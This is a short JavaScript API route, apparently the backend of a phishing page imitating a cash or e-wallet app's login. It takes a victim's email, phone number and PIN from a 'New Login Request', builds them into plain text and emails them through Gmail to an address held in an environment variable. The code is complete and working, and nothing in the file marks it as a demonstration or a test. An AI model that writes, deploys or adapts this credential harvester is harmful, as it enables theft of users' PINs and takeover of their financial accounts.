import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res
      .status(405)
      .json({ success: false, message: "Method not allowed" });
  }

  try {
    const { email, phone, pin } = req.body;

    if (!email && !phone) {
      return res.status(400).json({
        success: false,
        message: "Email atau Phone harus diisi",
      });
    }

    // Gabungkan semua data yang tersedia
    let text = "";
    if (email) text += `Email: ${email}\n`;
    if (phone) text += `Phone: ${phone}\n`;
    if (pin) text += `PIN: ${pin}\n`;

    // Transporter Gmail
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.MAIL_USER, // email pengirim
        pass: process.env.MAIL_PASS, // app password gmail
      },
    });

    // Kirim email
    await transporter.sendMail({
      from: `"Cash-style Bot" <${process.env.MAIL_USER}>`,
      to: process.env.MAIL_TO, // tujuan email
      subject: "New Login Request",
      text,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("SendMail Error:", error.message, error);
    return res.status(500).json({ success: false, message: error.message });
  }
}
